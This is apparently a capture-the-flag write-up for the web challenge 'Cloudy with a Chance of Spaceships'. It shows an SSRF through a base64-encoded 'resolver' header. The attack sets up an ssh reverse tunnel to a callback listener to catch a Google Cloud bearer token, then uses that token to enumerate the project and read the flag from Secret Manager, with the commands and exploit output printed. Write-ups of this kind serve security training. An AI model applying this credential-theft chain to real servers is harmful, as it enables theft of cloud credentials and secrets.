# Cloudy with a Chance of Spaceships - Web (67 pts)

**Flag:** `CSSCTF{your_forecast_says_love_is_on_its_way}`
**Resources:** No attached files. All data is extracted directly from the operational service server (via the `files/index.html` file of 1827 B and the source code file `files/2.CftUi-UM.js` of 5694 B, SHA256 `2cc74b92...b97e173`).

## Problem Description

The system provides a web application built with SvelteKit at `http://34.116.80.78:9143/`. The interface displays a list of five spaceships and provides a "measure hull temperature" function via respective buttons. The attached hint for the problem is: "What's your forecast looking like?". The ultimate goal is to retrieve the flag in the standard format `CSSCTF{...}`.
Technical characteristics: The interface completely lacks an input form. All user interactions trigger a network request to the address `/api/v1/ship/<name>/temperature`, after which the application will display a numeric value.

## Initial Analysis

Checking the response from the root path (`GET /`), the system returns the parameter `x-sveltekit-page: true` and the `link:` header listing all attached bundles. The server-rendered state data is `null`, and the API route is not configured to be directly visible in the HTML code. Therefore, the analysis process requires extracting the Javascript file `_app/immutable/nodes/2.CftUi-UM.js`. Inspecting this file reveals the following key code snippets:

```javascript
async function T(a,t,e){
  const r=a.currentTarget.textContent;
  ot(t,{ship:r},!0);
  C(t).temp=await(await fetch(`/api/v1/ship/${encodeURIComponent(r)}/temperature`,
    {headers:{"X-Resolver":e}})).text();
}
const e="XeyJyZXNvbHZlciI6Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1NwYWNlX3dlYXRoZXIifQ==";
```

The variable `e` is a constant pre-initialized in the bundle. The string part following the character `X` initially is the Base64 encoded segment of the JSON string `{"resolver":"https://en.wikipedia.org/wiki/Space_weather"}`. Accordingly, the network Header is constructed based on the format `"X" + base64(json)`, and this JSON string only contains a single key, `resolver`.

Proceed to test the Header structure directly against the server (data is saved in `analysis/resolver_probe.log`):

```text
Missing header case                           : Returns HTTP 451, body= (empty)
Non-base64 format case                        : Returns HTTP 451, body= (empty)
Base64 string missing resolver key case       : Returns HTTP 451, body= (empty)
Wikipedia Space_weather address               : Returns HTTP 200, body=3604.6
example.com (https) address                   : Returns HTTP 200, body=71.3
example.com (http) address                    : Returns HTTP 200, body=71.3
1.1.1.1 (http) address                        : Returns HTTP 200, body=5661.4
1.1.1.1 (https) address                       : Returns HTTP 200, body=5661.4
8.8.8.8 address (no HTTP)                     : Returns TimeoutError error
Internal address 127.0.0.1                    : Returns HTTP 500, body=<!doctype html>
```

From the test results table, the system derives three core operating principles:
1. The response result changes depending on the provided URL, completely independent of the spaceship name. (Testing a non-existent spaceship like `Zhiping` still returns the value `71.3` - according to `analysis/temperature_probe.log`). The `encodeURIComponent` command on the client is only used to protect the string structure, not acting as a computational parameter.
2. Using either the `http` or `https` protocol returns a similar value for the same page, confirming the protocol does not affect the calculation result.
3. Missing Headers or syntax errors are rejected with code 451. The system has no default fallback configuration, thus the `resolver` field is always controlled and routed according to the inputted data.

## Exploitation Chain

**Step 1 - Initialize the Header according to the bundle's standard.** 
The structure requires the prefix character `X` combined with a base64 string of a JSON containing the `resolver` key. Keeping the `X` character is mandatory because the server executes a syntax check on this string:

```python
def resolver_header(url):
    return "X" + base64.b64encode(json.dumps({"resolver": url}).encode()).decode()
```

**Step 2 - Exploit via SSRF (Server-Side Request Forgery).** 
Since processing takes place on the server, a callback port must be set up to verify the returning traffic. A viable method is to use a tunnel service via the `ssh` port forwarding feature using Git Bash:

```bash
python analysis/catch_auth.py 8911
ssh -R 80:localhost:8911 serveo.net
```

The Serveo service returns a public address, for example: `https://b838ca5ccee1ee4e-42-118-254-242.serveousercontent.com`. The `catch_auth.py` snippet is tasked with logging the JSON request streams into the `analysis/auth.log` file and responding with random content (`CLOUDY-<epoch>`) to ensure the numeric result changes across sessions, proving the server has actually read the response content. The `exploit.py` script calls `/api/v1/ship/Cassini/temperature` with the `resolver` pointing to the callback address just established:

```text
[+] Successful SSRF exploit, HTTP 200, temperature value='2.4'
```

**Step 3 - Extract identity information (Credential).** 
The Serveo service has the capability to maintain the exact headers sent by the client (only appending `x-forwarded-*` flags). The collected information streams accurately reflect the structure generated by the application (`analysis/capture.log`, the token string is redacted for security). The server traces the path at the root `/` due to serveo's routing configuration.

```text
=== 2026-10-01T09:25:42+00:00 GET /
    {
  "authorization": "Bearer ya29.c.c0AZ4...<1012 chars redacted>...d803yu",
  "user-agent": "node-fetch/1.0 (+https://github.com/bitinn/node-fetch)",
  "accept-encoding": "gzip,deflate",
  "x-real-ip": "34.116.80.78"
}
```

The recorded data shows three consecutive requests within the same minute containing an identical identity token. This proves the system is applying a caching mechanism for tokens. When the active session is spaced by about 20 minutes, a new token is initialized, and the `expires_in` value of the new token is found to be 3363 seconds.

**Step 4 - Validate the token.** 
Send the token to the `oauth2.googleapis.com/tokeninfo` endpoint. The system confirms and identifies this as a standard Access Token of the Google OAuth platform, eliminating the possibility of the token being a simulated string.

```text
[+] tokeninfo check: HTTP 200, scope=https://www.googleapis.com/auth/cloud-platform, exp=1790850141, expires_in=3333
```

**Step 5 - Trace the project identity.** 
Attempts to call the `cloudresourcemanager` service were blocked by a 403 error code (due to not being activated), but this very error response leaked the Project Number information. The `storage` service granted partial execution permissions, and its 403 error message directly revealed the Service Account and Project ID:

```text
[+] HTTP 403 response reveals Project Number 613713115850
[+] Storage 403 error reveals identity: meteorologist@css-ctf-2026.iam.gserviceaccount.com and Project ID css-ctf-2026
```

The service account using the keyword `meteorologist` perfectly matches the hypothetical context of the problem (the fleet's weather forecaster).

**Step 6 - Exploit Secret Manager.** 
With privileges (scope) at the `cloud-platform` level, accessing the `secretmanager` system was successful. The entire project account has only one secret, one version. The direct `:access` call method returns the flag value:

```text
[+] secretmanager check: HTTP 200, totalSize=1, secrets list=['goog_encryption_secret']
[+] Retrieve goog_encryption_secret@1 (45 chars) = CSSCTF{your_forecast_says_love_is_on_its_way}
```

**Verification:** The token was collected and used completely in raw form via the tunnel structure, with no hardcoded data in the script. The `exploit.py` script only signals success (exit 0) when the decrypted payload contains the `CSSCTF{` prefix, whilst also exporting the result to the `flag.txt` file. The resulting 45-character printable string meets the standard flag format, and the string content is directly related to the challenge's guiding question. Re-running the process 3 separate times with 3 different tokens all yielded identical results.

## Flag

Executing the script:

```bash
python exploit.py https://<hash>-<ip>.serveousercontent.com
```

```text
[+] Initialize http://34.116.80.78:9143/ -> HTTP 200, title='Cloudy with a Chance of Spaceships'
[+] SSRF Exploit -> HTTP 200, temperature value='2.4'
[+] Extract token from auth.log: Detected 3 copies, using the newest one (1024 chars)
[+] tokeninfo check -> HTTP 200, scope=https://www.googleapis.com/auth/cloud-platform, exp=1790850141, expires_in=3333
[+] HTTP 403 response reveals Project Number 613713115850
[+] storage 403 response validates account meteorologist@css-ctf-2026.iam.gserviceaccount.com and Project ID css-ctf-2026
[+] secretmanager check -> HTTP 200, totalSize=1, secrets=['goog_encryption_secret']
[+] Extract data goog_encryption_secret@1 (45 chars) = CSSCTF{your_forecast_says_love_is_on_its_way}
[+] Saved flag structure to flag.txt
```

Result:
```text
CSSCTF{your_forecast_says_love_is_on_its_way}
```
